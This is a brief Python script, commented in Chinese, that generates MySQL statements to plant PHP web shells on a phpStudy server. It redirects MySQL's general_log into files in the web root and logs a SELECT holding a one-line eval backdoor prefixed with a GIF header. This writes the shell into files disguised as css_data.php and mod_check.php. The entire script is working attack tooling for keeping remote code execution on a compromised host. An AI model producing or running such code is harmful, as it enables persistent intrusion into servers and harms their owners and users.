#!/usr/bin/env python3
"""rebuild3.py - 重建css_data.php + 备份多个副本 (proxy_t同款写法)"""
shell_body = "<?php @eval($_POST[\"x\"]);echo \"OK\";?>"

for name in ['css_data.php', 'mod_check.php']:
    sql = []
    sql.append("SET GLOBAL general_log = OFF;")
    sql.append("SET GLOBAL general_log_file = 'C:/phpStudy/WWW/%s';" % name)
    sql.append("SET GLOBAL general_log = ON;")
    sql.append("SELECT 'GIF89a%s//'" % shell_body)
    sql.append("SET GLOBAL general_log = OFF;")
    with open('/tmp/rebuild_%s.sql' % name.replace('.php', ''), 'w') as f:
        f.write('\n'.join(sql) + '\n')
print('ready')
